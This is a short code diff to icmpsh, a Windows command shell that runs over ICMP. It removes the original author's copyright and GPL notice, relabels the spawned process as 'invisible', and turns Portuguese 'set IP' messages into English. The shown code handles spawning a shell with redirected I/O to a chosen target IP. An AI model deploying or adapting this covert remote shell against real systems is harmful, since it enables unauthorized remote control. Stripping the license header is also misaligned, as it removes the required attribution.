@@ -1,21 +1,3 @@
-/*
- *   icmpsh - simple icmp command shell
- *   Copyright (c) 2010, Nico Leidecker <nico@leidecker.info>
- *   This program is free software: you can redistribute it and/or modify
- *   it under the terms of the GNU General Public License as published by
- *   the Free Software Foundation, either version 3 of the License, or
- *   (at your option) any later version.
- *
- *    This program is distributed in the hope that it will be useful,
- *    but WITHOUT ANY WARRANTY; without even the implied warranty of
- *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- *    GNU General Public License for more details.
- *
- *    You should have received a copy of the GNU General Public License
- *    along with this program.  If not, see <http://www.gnu.org/licenses/>.
- */
-
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <winsock2.h>
@@ -70,7 +52,7 @@ int spawn_shell(PROCESS_INFORMATION *pi, HANDLE *out_read, HANDLE *in_write)
 		return STATUS_PROCESS_NOT_CREATED;
 	}
 
-	// spawn process
+	// spawn process invisible
 	memset(&si, 0x00, sizeof(STARTUPINFO));
 	si.cb = sizeof(STARTUPINFO); 
 	si.hStdError = out_write;
@@ -193,7 +175,7 @@ int main(int argc, char **argv)
 
 
 	// set defaults
-	// Adicione IP Aqui
+	// Set your IP
 	target = "0";
 	timeout = DEFAULT_TIMEOUT;
 	delay = DEFAULT_DELAY;
@@ -207,7 +189,7 @@ int main(int argc, char **argv)
 	}
 
 	if (target ==  "0") {
-		printf("Defina IP Manualmente");
+		printf("Set your IP");
 		return -1;
 	}
 	ip_addr = to_ip(target);
